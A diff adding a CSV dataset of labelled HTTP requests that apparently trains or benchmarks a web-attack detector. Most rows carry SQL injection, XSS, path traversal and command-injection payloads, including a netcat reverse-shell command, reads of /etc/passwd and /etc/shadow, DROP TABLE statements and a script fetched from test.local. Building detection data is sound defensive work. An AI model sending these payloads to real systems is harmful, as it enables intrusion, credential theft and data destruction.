@@ -1,0 +1,365 @@
+method,path,query,headers,body,label,attack_type,source,seed_id
+GET,/tienda1/publico/ver.jsp,id=102&categoria=calzado,"{""User-Agent"": ""Mozilla/5.0 (compatible; CSIC-Benchmark/1.0)"", ""Accept"": ""*/*""}",,0,Benign,csic_2010,8ae2808573ac
+POST,/tienda1/miembros/editar.jsp,,"{""User-Agent"": ""Mozilla/5.0 (compatible; CSIC-Benchmark/1.0)"", ""Accept"": ""*/*""}",nombre=Juan&apellidos=Perez&email=juan@test.es,0,Benign,csic_2010,33b078570b26
+POST,/tienda1/publico/anadir.jsp,,"{""User-Agent"": ""Mozilla/5.0 (compatible; CSIC-Benchmark/1.0)"", ""Accept"": ""*/*""}",id=2&nombre=pantalon&precio=45&cantidad=1,0,Benign,csic_2010,80d7a7729147
+GET,/tienda1/publico/buscar.jsp,"texto=1' UNION SELECT username, password FROM usuarios--","{""User-Agent"": ""Mozilla/5.0 (compatible; CSIC-Benchmark/1.0)"", ""Accept"": ""*/*""}",,1,SQLi,csic_2010,b07e040d599b
+POST,/tienda1/miembros/editar.jsp,,"{""User-Agent"": ""Mozilla/5.0 (compatible; CSIC-Benchmark/1.0)"", ""Accept"": ""*/*""}",nombre=Maria&apellidos=Gomez&telefono=600123456,0,Benign,csic_2010,852f250f11fc
+GET,/tienda1/publico/ver.jsp,id=../../../etc/passwd,"{""User-Agent"": ""Mozilla/5.0 (compatible; CSIC-Benchmark/1.0)"", ""Accept"": ""*/*""}",,1,Path Traversal,csic_2010,12e2887ac2e4
+GET,/tienda1/publico/ver.jsp,id=101&categoria=ropa,"{""User-Agent"": ""Mozilla/5.0 (compatible; CSIC-Benchmark/1.0)"", ""Accept"": ""*/*""}",,0,Benign,csic_2010,ddfb258fd04e
+POST,/tienda1/miembros/editar.jsp,,"{""User-Agent"": ""Mozilla/5.0 (compatible; CSIC-Benchmark/1.0)"", ""Accept"": ""*/*""}",nombre=Admin' OR '1'='1&email=admin@test.es,1,SQLi,csic_2010,50e28fea49a6
+POST,/tienda1/publico/anadir.jsp,,"{""User-Agent"": ""Mozilla/5.0 (compatible; CSIC-Benchmark/1.0)"", ""Accept"": ""*/*""}",id=1&nombre=<script>alert('xss')</script>&precio=10,1,XSS,csic_2010,5a6d125aecf6
+GET,/tienda1/publico/ver.jsp,id=..%2f..%2fwindows%2fwin.ini,"{""User-Agent"": ""Mozilla/5.0 (compatible; CSIC-Benchmark/1.0)"", ""Accept"": ""*/*""}",,1,Path Traversal,csic_2010,43f1ea04524d
+POST,/tienda1/publico/anadir.jsp,,"{""User-Agent"": ""Mozilla/5.0 (compatible; CSIC-Benchmark/1.0)"", ""Accept"": ""*/*""}",id=1'; DROP TABLE cart;--&cantidad=1,1,SQLi,csic_2010,66bf6d3a7732
+GET,/search,input=javascript%3Aalert%281%29,"{""User-Agent"": ""Mozilla/5.0""}","{""comment"": ""javascript:alert(1)""}",1,XSS,synthetic,f46e38273a63
+POST,/api/v1/auth/refresh,,"{""Content-Type"": ""application/json"", ""X-Forwarded-For"": ""192.168.1.109""}","{""refresh_token"": ""invalid.tampered.jwt_token_signature""}",1,Brute Force/Auth Abuse,synthetic,74af583d5b19
+GET,/api/v1/login,q=1%27%20AND%20%28SELECT%201%20FROM%20%28SELECT%20COUNT%28%2A%29%2C%20CONCAT%28%28SELECT%20version%28%29%29%2C%20FLOOR%28RAND%280%29%2A2%29%29%20x%20FROM%20information_schema.tables%20GROUP%20BY%20x%29%20a%29--,"{""User-Agent"": ""Mozilla/5.0""}",user=1%27%20AND%20%28SELECT%201%20FROM%20%28SELECT%20COUNT%28%2A%29%2C%20CONCAT%28%28SELECT%20version%28%29%29%2C%20FLOOR%28RAND%280%29%2A2%29%29%20x%20FROM%20information_schema.tables%20GROUP%20BY%20x%29%20a%29--&pass=123,1,SQLi,synthetic,9325a351c6d2
+GET,/search,input=%3Cscript%3Ealert%28document.domain%29%3C/script%3E,"{""User-Agent"": ""Mozilla/5.0""}",,1,XSS,synthetic,3e3c8269efd0
+GET,/api/v1/static/....//....//....//etc/passwd,file=....//....//....//etc/passwd,"{""User-Agent"": ""Mozilla/5.0""}",,1,Path Traversal,synthetic,d38312606f6a
+GET,/.git/config,,"{""User-Agent"": ""AegisSecurityScanner/1.0""}",,1,Other,synthetic,d00939a7978b
+POST,/search,,"{""User-Agent"": ""Mozilla/5.0""}",,1,XSS,synthetic,59cc7f033951
+GET,/search,input=%3Ca%20href%3D%22javascript%3Aalert%28%27AegisGate%27%29%22%3Eclick%3C/a%3E,"{""User-Agent"": ""Mozilla/5.0""}",,1,XSS,synthetic,6d1170faf15d
+GET,/.env,,"{""User-Agent"": ""AegisSecurityScanner/1.0""}",,1,Other,synthetic,598fa93bb7b7
+POST,/api/v1/auth/login,,"{""Content-Type"": ""application/json"", ""X-Forwarded-For"": ""192.168.1.245""}","{""username"": ""admin"", ""password"": ""admin123""}",1,Brute Force/Auth Abuse,synthetic,f02295cce453
+POST,/api/v1/admin/ping,,"{""Content-Type"": ""application/x-www-form-urlencoded""}",ip=127.0.0.1%3B%20uname%20-a,1,Command Injection,synthetic,50fc4005e7c1
+GET,/api/v1/users/profile,"include=avatar,settings","{""User-Agent"": ""Mozilla/5.0 (Windows NT 10.0; Win64)""}",,0,Benign,synthetic,7d267d3108ce
+GET,/latest/meta-data/,,"{""User-Agent"": ""AegisSecurityScanner/1.0""}",,1,Other,synthetic,26e354cb3220
+GET,/api/v1/static/%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd,file=%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd,"{""User-Agent"": ""Mozilla/5.0""}",,1,Path Traversal,synthetic,043f00539530
+POST,/api/v1/admin/ping,,"{""Content-Type"": ""application/x-www-form-urlencoded""}",ip=127.0.0.1%26%20whoami,1,Command Injection,synthetic,9455c7b3490c
+POST,/api/v1/auth/login,,"{""Content-Type"": ""application/json"", ""X-Forwarded-For"": ""192.168.1.21""}","{""username"": ""guest"", ""password"": ""guest""}",1,Brute Force/Auth Abuse,synthetic,dbb04fad1d2e
+POST,/api/v1/admin/ping,,"{""Content-Type"": ""application/x-www-form-urlencoded""}",ip=127.0.0.1%7C%20ls%20-la%20/tmp,1,Command Injection,synthetic,f1f2a9020b04
+POST,/api/v1/auth/login,,"{""Content-Type"": ""application/json"", ""X-Forwarded-For"": ""192.168.1.62""}","{""username"": ""root"", ""password"": ""toor""}",1,Brute Force/Auth Abuse,synthetic,20a7dce568d6
+POST,/api/v1/comments,,"{""User-Agent"": ""Mozilla/5.0""}",,1,XSS,synthetic,1f032fa47ca9
+POST,/search,,"{""User-Agent"": ""Mozilla/5.0""}","{""comment"": ""<body onload=alert('XSS')>""}",1,XSS,synthetic,d67606d9712d
+GET,/api/v1/comments,input=javascript%3Aalert%281%29,"{""User-Agent"": ""Mozilla/5.0""}","{""comment"": ""javascript:alert(1)""}",1,XSS,synthetic,3509737c49a8
+GET,/search,input=%3Ca%20href%3D%22javascript%3Aalert%28%27AegisGate%27%29%22%3Eclick%3C/a%3E,"{""User-Agent"": ""Mozilla/5.0""}","{""comment"": ""<a href=\""javascript:alert('AegisGate')\"">click</a>""}",1,XSS,synthetic,0fcf06c984e3
+GET,/api/v1/comments,,"{""User-Agent"": ""Mozilla/5.0""}",,1,XSS,synthetic,d391a937a993
+GET,/actuator/health,,"{""User-Agent"": ""AegisSecurityScanner/1.0""}",,1,Other,synthetic,8393597e9d1d
+POST,/api/v1/login,q=admin%27%20--,"{""User-Agent"": ""Mozilla/5.0""}",user=admin%27%20--&pass=123,1,SQLi,synthetic,8d6d3a9e937b
+POST,/api/v1/login,q=%27%20UNION%20SELECT%20username%2C%20password%20FROM%20users--,"{""User-Agent"": ""Mozilla/5.0""}",,1,SQLi,synthetic,7d690840fe32
+POST,/api/v1/orders,,"{""User-Agent"": ""Mozilla/5.0 (Windows NT 10.0; Win64)""}","{""items"": [{""id"": 10, ""qty"": 1}], ""coupon"": ""WELCOME10""}",0,Benign,synthetic,ac879716a054
+GET,/api/v1/static/../../../../etc/passwd,file=../../../../etc/passwd,"{""User-Agent"": ""Mozilla/5.0""}",,1,Path Traversal,synthetic,8dd9014d85b3
+POST,/api/v1/search,,"{""User-Agent"": ""Mozilla/5.0""}",user=admin%27%29%20OR%20%28%271%27%3D%271%27--&pass=123,1,SQLi,synthetic,6382c24768c0
+GET,/search,input=%3Csvg%20onload%3Dalert%281%29%3E,"{""User-Agent"": ""Mozilla/5.0""}","{""comment"": ""<svg onload=alert(1)>""}",1,XSS,synthetic,1a7b68bdde47
+GET,/api/v1/static/C:\windows\system32\drivers\etc\hosts,file=C%3A%5Cwindows%5Csystem32%5Cdrivers%5Cetc%5Chosts,"{""User-Agent"": ""Mozilla/5.0""}",,1,Path Traversal,synthetic,3d79dfd7e8eb
+GET,/api/v1/static//etc/shadow,file=/etc/shadow,"{""User-Agent"": ""Mozilla/5.0""}",,1,Path Traversal,synthetic,c36126146555
+GET,/api/v1/static/../../../../boot.ini,file=../../../../boot.ini,"{""User-Agent"": ""Mozilla/5.0""}",,1,Path Traversal,synthetic,d49dccd6af1a
+POST,/search,input=%27%22%3E%3Cscript%20src%3Dhttp%3A//test.local/xss.js%3E%3C/script%3E,"{""User-Agent"": ""Mozilla/5.0""}","{""comment"": ""'\""><script src=http://test.local/xss.js></script>""}",1,XSS,synthetic,55f2d3651b6d
+GET,/search,,"{""User-Agent"": ""Mozilla/5.0""}",,1,XSS,synthetic,1ad5cb21c968
+GET,/api/v1/login,,"{""User-Agent"": ""Mozilla/5.0""}",,1,SQLi,synthetic,893a1ab589e1
+POST,/api/v1/admin/ping,,"{""Content-Type"": ""application/x-www-form-urlencoded""}",ip=127.0.0.1%60whoami%60,1,Command Injection,synthetic,f2924acf1e95
+GET,/api/v1/login,,"{""User-Agent"": ""Mozilla/5.0""}",user=%27%20OR%20%27a%27%3D%27a&pass=123,1,SQLi,synthetic,99bf859c5cf8
+POST,/api/v1/admin/ping,,"{""Content-Type"": ""application/x-www-form-urlencoded""}",ip=127.0.0.1%7C%20netcat%20-e%20/bin/sh%20127.0.0.1%204444,1,Command Injection,synthetic,60fb77904823
+POST,/api/v1/search,,"{""User-Agent"": ""Mozilla/5.0""}",,1,SQLi,synthetic,5a32fc524e05
+POST,/search,input=%3Cimg%20src%3Dx%20onerror%3Dalert%28%27XSS%27%29%3E,"{""User-Agent"": ""Mozilla/5.0""}","{""comment"": ""<img src=x onerror=alert('XSS')>""}",1,XSS,synthetic,804a58672626
+GET,/api/v1/search,,"{""User-Agent"": ""Mozilla/5.0""}",,1,SQLi,synthetic,7acc8746ddd2
+POST,/api/v1/login,q=1%27%20AND%20%28SELECT%201%20FROM%20%28SELECT%20COUNT%28%2A%29%2C%20CONCAT%28%28SELECT%20version%28%29%29%2C%20FLOOR%28RAND%280%29%2A2%29%29%20x%20FROM%20information_schema.tables%20GROUP%20BY%20x%29%20a%29--,"{""User-Agent"": ""Mozilla/5.0""}",user=1%27%20AND%20%28SELECT%201%20FROM%20%28SELECT%20COUNT%28%2A%29%2C%20CONCAT%28%28SELECT%20version%28%29%29%2C%20FLOOR%28RAND%280%29%2A2%29%29%20x%20FROM%20information_schema.tables%20GROUP%20BY%20x%29%20a%29--&pass=123,1,SQLi,synthetic,9a6db987a6ff
+GET,/api/v1/login,q=%27%20UNION%20SELECT%20username%2C%20password%20FROM%20users--,"{""User-Agent"": ""Mozilla/5.0""}",,1,SQLi,synthetic,bf0c16ef9206
+POST,/api/v1/search,,"{""User-Agent"": ""Mozilla/5.0""}",user=%27%3B%20WAITFOR%20DELAY%20%270%3A0%3A5%27--&pass=123,1,SQLi,synthetic,bd9ab6681355
+GET,/search,input=%3Cscript%3Ealert%28document.domain%29%3C/script%3E,"{""User-Agent"": ""Mozilla/5.0""}","{""comment"": ""<script>alert(document.domain)</script>""}",1,XSS,synthetic,0216ea9a56ce
+POST,/api/v1/login,,"{""User-Agent"": ""Mozilla/5.0""}",,1,SQLi,synthetic,b888badc8dba
+POST,/search,input=javascript%3Aalert%281%29,"{""User-Agent"": ""Mozilla/5.0""}","{""comment"": ""javascript:alert(1)""}",1,XSS,synthetic,955da9602fb8
+GET,/api/v1/login,q=1%3B%20DROP%20TABLE%20logs--,"{""User-Agent"": ""Mozilla/5.0""}",user=1%3B%20DROP%20TABLE%20logs--&pass=123,1,SQLi,synthetic,ba383c23b217
+GET,/api/v1/search,q=1%27%20ORDER%20BY%2010--,"{""User-Agent"": ""Mozilla/5.0""}",,1,SQLi,synthetic,71ce49049aef
+GET,/api/v1/search,q=%27%20UNION%20SELECT%20NULL%2C%20NULL%2C%20NULL--,"{""User-Agent"": ""Mozilla/5.0""}",user=%27%20UNION%20SELECT%20NULL%2C%20NULL%2C%20NULL--&pass=123,1,SQLi,synthetic,d2acc15453b6
+POST,/api/v1/login,q=1%3B%20DROP%20TABLE%20logs--,"{""User-Agent"": ""Mozilla/5.0""}",,1,SQLi,synthetic,85d30114f912
+POST,/api/v1/search,q=%27%20UNION%20SELECT%20NULL%2C%20NULL%2C%20NULL--,"{""User-Agent"": ""Mozilla/5.0""}",,1,SQLi,synthetic,4c4ae68bed73
+GET,/api/v1/login,q=1%27%20ORDER%20BY%2010--,"{""User-Agent"": ""Mozilla/5.0""}",user=1%27%20ORDER%20BY%2010--&pass=123,1,SQLi,synthetic,7f4853ebfc8b
+POST,/api/v1/comments,,"{""User-Agent"": ""Mozilla/5.0""}","{""comment"": ""'\""><script src=http://test.local/xss.js></script>""}",1,XSS,synthetic,88805d1ac19c
+POST,/search,input=%27%22%3E%3Cscript%20src%3Dhttp%3A//test.local/xss.js%3E%3C/script%3E,"{""User-Agent"": ""Mozilla/5.0""}",,1,XSS,synthetic,c999df2608ff
+POST,/api/v1/search,q=1%3B%20DROP%20TABLE%20logs--,"{""User-Agent"": ""Mozilla/5.0""}",,1,SQLi,synthetic,6378146d361d
+GET,/api/v1/search,,"{""User-Agent"": ""Mozilla/5.0""}",user=1%20OR%201%3D1&pass=123,1,SQLi,synthetic,4b1e3ec51b58
+POST,/api/v1/comments,input=javascript%3Aalert%281%29,"{""User-Agent"": ""Mozilla/5.0""}","{""comment"": ""javascript:alert(1)""}",1,XSS,synthetic,41a1d05d5087
+GET,/search,input=%3Ciframe%20src%3D%22javascript%3Aalert%281%29%22%3E,"{""User-Agent"": ""Mozilla/5.0""}",,1,XSS,synthetic,e4ba6be787ef
+GET,/api/v1/notifications,unread_only=true&limit=5,"{""User-Agent"": ""Mozilla/5.0 (Windows NT 10.0; Win64)""}",,0,Benign,synthetic,4d4bc2c0bdd1
+POST,/api/v1/comments,input=%3Csvg%20onload%3Dalert%281%29%3E,"{""User-Agent"": ""Mozilla/5.0""}",,1,XSS,synthetic,412a754b3d67
+POST,/api/v1/comments,,"{""User-Agent"": ""Mozilla/5.0""}","{""comment"": ""<img src=x onerror=alert('XSS')>""}",1,XSS,synthetic,2f70136c932d
+POST,/api/v1/search,q=admin%27%29%20OR%20%28%271%27%3D%271%27--,"{""User-Agent"": ""Mozilla/5.0""}",,1,SQLi,synthetic,dbb5263b7fbf
+POST,/api/v1/search,q=%27%20OR%20sleep%285%29%23,"{""User-Agent"": ""Mozilla/5.0""}",,1,SQLi,synthetic,944aa1f50694
+POST,/api/v1/search,,"{""User-Agent"": ""Mozilla/5.0""}",user=admin%27%20--&pass=123,1,SQLi,synthetic,535754715223
+GET,/api/v1/login,q=%27%3B%20WAITFOR%20DELAY%20%270%3A0%3A5%27--,"{""User-Agent"": ""Mozilla/5.0""}",user=%27%3B%20WAITFOR%20DELAY%20%270%3A0%3A5%27--&pass=123,1,SQLi,synthetic,681a0a49bc3e
+GET,/search,input=%27%22%3E%3Cscript%20src%3Dhttp%3A//test.local/xss.js%3E%3C/script%3E,"{""User-Agent"": ""Mozilla/5.0""}","{""comment"": ""'\""><script src=http://test.local/xss.js></script>""}",1,XSS,synthetic,796065ff8f76
+GET,/search,input=%3Cbody%20onload%3Dalert%28%27XSS%27%29%3E,"{""User-Agent"": ""Mozilla/5.0""}",,1,XSS,synthetic,773528530881
+POST,/api/v1/admin/ping,,"{""Content-Type"": ""application/x-www-form-urlencoded""}",ip=127.0.0.1%3B%20cat%20/etc/passwd,1,Command Injection,synthetic,c29eeec046d8
+POST,/api/v1/login,q=%27%20OR%20%27a%27%3D%27a,"{""User-Agent"": ""Mozilla/5.0""}",user=%27%20OR%20%27a%27%3D%27a&pass=123,1,SQLi,synthetic,c8f73b37dfe9
+POST,/api/v1/search,,"{""User-Agent"": ""Mozilla/5.0""}",user=1%20OR%201%3D1&pass=123,1,SQLi,synthetic,c6d55b3f8a9a
+POST,/api/v1/search,q=%27%20OR%20%27a%27%3D%27a,"{""User-Agent"": ""Mozilla/5.0""}",,1,SQLi,synthetic,730b1293c88d
+GET,/search,input=%27%22%3E%3Cscript%20src%3Dhttp%3A//test.local/xss.js%3E%3C/script%3E,"{""User-Agent"": ""Mozilla/5.0""}",,1,XSS,synthetic,0b0fdb9d7dcd
+POST,/api/v1/search,q=%27%20UNION%20SELECT%20username%2C%20password%20FROM%20users--,"{""User-Agent"": ""Mozilla/5.0""}",user=%27%20UNION%20SELECT%20username%2C%20password%20FROM%20users--&pass=123,1,SQLi,synthetic,d80e91f28a0a
+GET,/api/v1/comments,,"{""User-Agent"": ""Mozilla/5.0""}","{""comment"": ""javascript:alert(1)""}",1,XSS,synthetic,98e6e29feb58
+GET,/api/v1/login,q=%27%20OR%20sleep%285%29%23,"{""User-Agent"": ""Mozilla/5.0""}",,1,SQLi,synthetic,0b808af5248f
+POST,/api/v1/login,q=%27%20UNION%20SELECT%20NULL%2C%20NULL%2C%20NULL--,"{""User-Agent"": ""Mozilla/5.0""}",,1,SQLi,synthetic,837ea9e6da50
+GET,/api/v1/comments,input=%3Ca%20href%3D%22javascript%3Aalert%28%27AegisGate%27%29%22%3Eclick%3C/a%3E,"{""User-Agent"": ""Mozilla/5.0""}",,1,XSS,synthetic,99ab131c2b23
+GET,/api/v1/comments,input=%27%22%3E%3Cscript%20src%3Dhttp%3A//test.local/xss.js%3E%3C/script%3E,"{""User-Agent"": ""Mozilla/5.0""}",,1,XSS,synthetic,1b42a4aca5fa
+GET,/search,input=%3Ciframe%20src%3D%22javascript%3Aalert%281%29%22%3E,"{""User-Agent"": ""Mozilla/5.0""}","{""comment"": ""<iframe src=\""javascript:alert(1)\"">""}",1,XSS,synthetic,777629b8d5ed
+POST,/api/v1/login,q=%27%20OR%20sleep%285%29%23,"{""User-Agent"": ""Mozilla/5.0""}",,1,SQLi,synthetic,b8ccf5b86c8c
+GET,/api/v1/login,q=%27%20UNION%20SELECT%20NULL%2C%20NULL%2C%20NULL--,"{""User-Agent"": ""Mozilla/5.0""}",user=%27%20UNION%20SELECT%20NULL%2C%20NULL%2C%20NULL--&pass=123,1,SQLi,synthetic,42146f419ae4
+GET,/api/v1/search,q=1%20OR%201%3D1,"{""User-Agent"": ""Mozilla/5.0""}",,1,SQLi,synthetic,7e4e91b00846
+POST,/api/v1/comments,input=%3Cimg%20src%3Dx%20onerror%3Dalert%28%27XSS%27%29%3E,"{""User-Agent"": ""Mozilla/5.0""}","{""comment"": ""<img src=x onerror=alert('XSS')>""}",1,XSS,synthetic,98c69563f64e
+POST,/api/v1/search,q=%27%20OR%201%3D1--,"{""User-Agent"": ""Mozilla/5.0""}",,1,SQLi,synthetic,c859a0191b22
+GET,/api/v1/comments,input=javascript%3Aalert%281%29,"{""User-Agent"": ""Mozilla/5.0""}",,1,XSS,synthetic,35dc6ebb8e83
+GET,/api/v1/login,q=%27%20OR%20%27a%27%3D%27a,"{""User-Agent"": ""Mozilla/5.0""}",,1,SQLi,synthetic,4538d9ae5b4b
+POST,/api/v1/login,q=%27%3B%20WAITFOR%20DELAY%20%270%3A0%3A5%27--,"{""User-Agent"": ""Mozilla/5.0""}",,1,SQLi,synthetic,780ab9d754c8
+POST,/api/v1/comments,input=%3Cbody%20onload%3Dalert%28%27XSS%27%29%3E,"{""User-Agent"": ""Mozilla/5.0""}","{""comment"": ""<body onload=alert('XSS')>""}",1,XSS,synthetic,a27ed750312e
+GET,/api/v1/login,q=%27%20OR%20%27a%27%3D%27a,"{""User-Agent"": ""Mozilla/5.0""}",user=%27%20OR%20%27a%27%3D%27a&pass=123,1,SQLi,synthetic,0920a5e84502
+POST,/api/v1/search,q=%27%3B%20WAITFOR%20DELAY%20%270%3A0%3A5%27--,"{""User-Agent"": ""Mozilla/5.0""}",,1,SQLi,synthetic,0f2a7f7a49d7
+GET,/api/v1/login,q=admin%27%29%20OR%20%28%271%27%3D%271%27--,"{""User-Agent"": ""Mozilla/5.0""}",,1,SQLi,synthetic,ab36ad80ad6b
+POST,/api/v1/search,q=%27%20UNION%20SELECT%20username%2C%20password%20FROM%20users--,"{""User-Agent"": ""Mozilla/5.0""}",,1,SQLi,synthetic,9e6c60c62d04
+POST,/api/v1/login,q=%27%20OR%20%27a%27%3D%27a,"{""User-Agent"": ""Mozilla/5.0""}",,1,SQLi,synthetic,790280c49ec4
+POST,/search,,"{""User-Agent"": ""Mozilla/5.0""}","{""comment"": ""<input onfocus=alert(1) autofocus>""}",1,XSS,synthetic,acff3b88957e
+GET,/api/v1/search,q=admin%27%20--,"{""User-Agent"": ""Mozilla/5.0""}",,1,SQLi,synthetic,1c9a6e461255
+GET,/api/v1/search,q=%27%3B%20WAITFOR%20DELAY%20%270%3A0%3A5%27--,"{""User-Agent"": ""Mozilla/5.0""}",,1,SQLi,synthetic,dfbd563d242e
+POST,/search,,"{""User-Agent"": ""Mozilla/5.0""}","{""comment"": ""<svg onload=alert(1)>""}",1,XSS,synthetic,c48a50efbe4d
+POST,/search,input=%3Cinput%20onfocus%3Dalert%281%29%20autofocus%3E,"{""User-Agent"": ""Mozilla/5.0""}","{""comment"": ""<input onfocus=alert(1) autofocus>""}",1,XSS,synthetic,b6abc3d81543
+POST,/api/v1/comments,input=%27%22%3E%3Cscript%20src%3Dhttp%3A//test.local/xss.js%3E%3C/script%3E,"{""User-Agent"": ""Mozilla/5.0""}",,1,XSS,synthetic,8ab2e3ce9ca0
+POST,/api/v1/comments,input=%3Cscript%3Ealert%28document.domain%29%3C/script%3E,"{""User-Agent"": ""Mozilla/5.0""}",,1,XSS,synthetic,7a5f09481222
+POST,/api/v1/search,q=1%27%20AND%20%28SELECT%201%20FROM%20%28SELECT%20COUNT%28%2A%29%2C%20CONCAT%28%28SELECT%20version%28%29%29%2C%20FLOOR%28RAND%280%29%2A2%29%29%20x%20FROM%20information_schema.tables%20GROUP%20BY%20x%29%20a%29--,"{""User-Agent"": ""Mozilla/5.0""}",user=1%27%20AND%20%28SELECT%201%20FROM%20%28SELECT%20COUNT%28%2A%29%2C%20CONCAT%28%28SELECT%20version%28%29%29%2C%20FLOOR%28RAND%280%29%2A2%29%29%20x%20FROM%20information_schema.tables%20GROUP%20BY%20x%29%20a%29--&pass=123,1,SQLi,synthetic,edb4303db921
+POST,/search,input=%3Ca%20href%3D%22javascript%3Aalert%28%27AegisGate%27%29%22%3Eclick%3C/a%3E,"{""User-Agent"": ""Mozilla/5.0""}",,1,XSS,synthetic,3bb310f6843b
+GET,/api/v1/login,,"{""User-Agent"": ""Mozilla/5.0""}",user=%27%20UNION%20SELECT%20NULL%2C%20NULL%2C%20NULL--&pass=123,1,SQLi,synthetic,c503c7ca0d6f
+GET,/api/v1/search,q=%27%20OR%201%3D1--,"{""User-Agent"": ""Mozilla/5.0""}",user=%27%20OR%201%3D1--&pass=123,1,SQLi,synthetic,caf34a6e4e7a
+POST,/api/v1/comments,input=%3Cscript%3Ealert%281%29%3C/script%3E,"{""User-Agent"": ""Mozilla/5.0""}",,1,XSS,synthetic,544bf5bc5a72
+GET,/api/v1/search,,"{""User-Agent"": ""Mozilla/5.0""}",user=1%27%20AND%20%28SELECT%201%20FROM%20%28SELECT%20COUNT%28%2A%29%2C%20CONCAT%28%28SELECT%20version%28%29%29%2C%20FLOOR%28RAND%280%29%2A2%29%29%20x%20FROM%20information_schema.tables%20GROUP%20BY%20x%29%20a%29--&pass=123,1,SQLi,synthetic,8ef6d0cda21e
+GET,/api/v1/search,q=1%27%20AND%20%28SELECT%201%20FROM%20%28SELECT%20COUNT%28%2A%29%2C%20CONCAT%28%28SELECT%20version%28%29%29%2C%20FLOOR%28RAND%280%29%2A2%29%29%20x%20FROM%20information_schema.tables%20GROUP%20BY%20x%29%20a%29--,"{""User-Agent"": ""Mozilla/5.0""}",user=1%27%20AND%20%28SELECT%201%20FROM%20%28SELECT%20COUNT%28%2A%29%2C%20CONCAT%28%28SELECT%20version%28%29%29%2C%20FLOOR%28RAND%280%29%2A2%29%29%20x%20FROM%20information_schema.tables%20GROUP%20BY%20x%29%20a%29--&pass=123,1,SQLi,synthetic,8f64b638999d
+GET,/api/v1/login,,"{""User-Agent"": ""Mozilla/5.0""}",user=%27%20OR%201%3D1--&pass=123,1,SQLi,synthetic,643c40f4313e
+POST,/search,input=%3Cscript%3Ealert%281%29%3C/script%3E,"{""User-Agent"": ""Mozilla/5.0""}","{""comment"": ""<script>alert(1)</script>""}",1,XSS,synthetic,21c5d9440e2a
+GET,/api/v1/comments,input=%3Cinput%20onfocus%3Dalert%281%29%20autofocus%3E,"{""User-Agent"": ""Mozilla/5.0""}","{""comment"": ""<input onfocus=alert(1) autofocus>""}",1,XSS,synthetic,ccf8a5fc1bf0
+GET,/api/v1/login,,"{""User-Agent"": ""Mozilla/5.0""}",user=1%27%20ORDER%20BY%2010--&pass=123,1,SQLi,synthetic,72293760eba0
+GET,/api/v1/comments,input=%3Ca%20href%3D%22javascript%3Aalert%28%27AegisGate%27%29%22%3Eclick%3C/a%3E,"{""User-Agent"": ""Mozilla/5.0""}","{""comment"": ""<a href=\""javascript:alert('AegisGate')\"">click</a>""}",1,XSS,synthetic,f7dbf2bf37e2
+GET,/api/v1/search,q=%27%20OR%20sleep%285%29%23,"{""User-Agent"": ""Mozilla/5.0""}",user=%27%20OR%20sleep%285%29%23&pass=123,1,SQLi,synthetic,56a5195b54df
+GET,/search,input=%3Cinput%20onfocus%3Dalert%281%29%20autofocus%3E,"{""User-Agent"": ""Mozilla/5.0""}","{""comment"": ""<input onfocus=alert(1) autofocus>""}",1,XSS,synthetic,3131534e8b26
+GET,/search,input=%3Cbody%20onload%3Dalert%28%27XSS%27%29%3E,"{""User-Agent"": ""Mozilla/5.0""}","{""comment"": ""<body onload=alert('XSS')>""}",1,XSS,synthetic,67e6d0a0c503
+POST,/api/v1/comments,input=%3Cimg%20src%3Dx%20onerror%3Dalert%28%27XSS%27%29%3E,"{""User-Agent"": ""Mozilla/5.0""}",,1,XSS,synthetic,de3d83b03390
+GET,/search,input=%3Cimg%20src%3Dx%20onerror%3Dalert%28%27XSS%27%29%3E,"{""User-Agent"": ""Mozilla/5.0""}",,1,XSS,synthetic,b5206807a57f
+POST,/api/v1/login,,"{""User-Agent"": ""Mozilla/5.0""}",user=1%27%20ORDER%20BY%2010--&pass=123,1,SQLi,synthetic,62c6b2ec2442
+GET,/api/v1/login,q=1%3B%20DROP%20TABLE%20logs--,"{""User-Agent"": ""Mozilla/5.0""}",,1,SQLi,synthetic,d02d3ef1c62d
+POST,/api/v1/login,,"{""User-Agent"": ""Mozilla/5.0""}",user=%27%3B%20WAITFOR%20DELAY%20%270%3A0%3A5%27--&pass=123,1,SQLi,synthetic,ca85743f56f5
+POST,/api/v1/search,,"{""User-Agent"": ""Mozilla/5.0""}",user=1%27%20ORDER%20BY%2010--&pass=123,1,SQLi,synthetic,907ad42fce89
+POST,/api/v1/comments,input=%27%22%3E%3Cscript%20src%3Dhttp%3A//test.local/xss.js%3E%3C/script%3E,"{""User-Agent"": ""Mozilla/5.0""}","{""comment"": ""'\""><script src=http://test.local/xss.js></script>""}",1,XSS,synthetic,45ee5017fed1
+POST,/api/v1/search,,"{""User-Agent"": ""Mozilla/5.0""}",user=%27%20OR%20%27a%27%3D%27a&pass=123,1,SQLi,synthetic,bde8a75cd7eb
+GET,/search,,"{""User-Agent"": ""Mozilla/5.0""}","{""comment"": ""<input onfocus=alert(1) autofocus>""}",1,XSS,synthetic,99347abaabae
+POST,/api/v1/search,q=1%27%20AND%20%28SELECT%201%20FROM%20%28SELECT%20COUNT%28%2A%29%2C%20CONCAT%28%28SELECT%20version%28%29%29%2C%20FLOOR%28RAND%280%29%2A2%29%29%20x%20FROM%20information_schema.tables%20GROUP%20BY%20x%29%20a%29--,"{""User-Agent"": ""Mozilla/5.0""}",,1,SQLi,synthetic,dd1e41ba90ed
+GET,/api/v1/login,,"{""User-Agent"": ""Mozilla/5.0""}",user=admin%27%20--&pass=123,1,SQLi,synthetic,c46b348e35a2
+GET,/search,input=%3Cscript%3Ealert%281%29%3C/script%3E,"{""User-Agent"": ""Mozilla/5.0""}","{""comment"": ""<script>alert(1)</script>""}",1,XSS,synthetic,44485d22f0e0
+GET,/api/v1/comments,input=%3Cinput%20onfocus%3Dalert%281%29%20autofocus%3E,"{""User-Agent"": ""Mozilla/5.0""}",,1,XSS,synthetic,c6e22dae7a6b
+GET,/api/v1/login,,"{""User-Agent"": ""Mozilla/5.0""}",user=1%20OR%201%3D1&pass=123,1,SQLi,synthetic,3a16915cf89c
+GET,/api/v1/search,q=%27%3B%20WAITFOR%20DELAY%20%270%3A0%3A5%27--,"{""User-Agent"": ""Mozilla/5.0""}",user=%27%3B%20WAITFOR%20DELAY%20%270%3A0%3A5%27--&pass=123,1,SQLi,synthetic,9df717b13a94
+POST,/search,input=%3Ciframe%20src%3D%22javascript%3Aalert%281%29%22%3E,"{""User-Agent"": ""Mozilla/5.0""}",,1,XSS,synthetic,b857280a756c
